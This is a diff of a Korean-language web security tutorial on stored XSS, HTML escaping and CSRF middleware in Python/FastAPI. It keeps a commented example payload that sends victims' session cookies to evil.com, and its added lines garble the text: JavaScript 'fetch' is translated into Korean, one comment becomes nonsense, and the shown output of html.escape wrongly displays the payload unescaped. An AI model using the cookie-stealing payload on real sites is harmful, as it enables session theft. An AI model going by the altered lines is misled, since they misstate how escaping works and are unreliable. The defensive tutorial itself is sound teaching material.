@@ -209,7 +209,7 @@ async def list_comments():
     return f"<ul>{items}</ul>"
 
 # 공격자가 저장하는 댓글:
-# <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
+# <script>가져오기('https://evil.com/steal?c='+document.cookie)</script>
 # → 다른 사용자가 댓글 목록을 볼 때 세션 쿠키 탈취
 ```
 
@@ -221,7 +221,7 @@ import html
 async def list_comments_safe():
     items = "".join(f"<li>{html.escape(c)}</li>" for c in comments_db)
     return f"<ul>{items}</ul>"
-    # <script> → &lt;script&gt; 로 변환되어 텍스트로만 표시
+    # <스크립트> → <스크립트> 로 변환하여 로마 표시
 ```
 
 Stored XSS가 특히 위험한 이유는 공격자가 없어도 페이로드가 계속 실행된다는 점입니다. 한 번 저장되면 해당 페이지를 방문하는 모든 사용자가 피해자가 됩니다.
@@ -237,9 +237,9 @@ import urllib.parse
 
 user_input = '"><script>alert(1)</script>'
 
-# 1. HTML 본문 — HTML entity 이스케이프
+# 1. HTML 본문 — HTML 엔터티 이스케이프
 safe_html = html.escape(user_input)
-# → &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+# → "><script>alert(1)</script>
 template = f"<div>{safe_html}</div>"
 
 # 2. HTML 속성 — 따옴표 포함 이스케이프 + 항상 따옴표로 감싸기
@@ -410,7 +410,7 @@ app = FastAPI()
 @app.middleware("http")
 async def csrf_check(request: Request, call_next):
     if request.method in ("POST", "PUT", "DELETE", "PATCH"):
-        # SPA는 fetch/XHR로 요청 → 커스텀 헤더 추가 가능
+        # SPA는 fetch/XHR로 요청 → 맞춤형 헤더 추가 가능
         # 단순 form submit이나 이미지 태그로는 커스텀 헤더 불가
         csrf_header = request.headers.get("X-CSRF-Token")
         csrf_cookie = request.cookies.get("csrf_token")
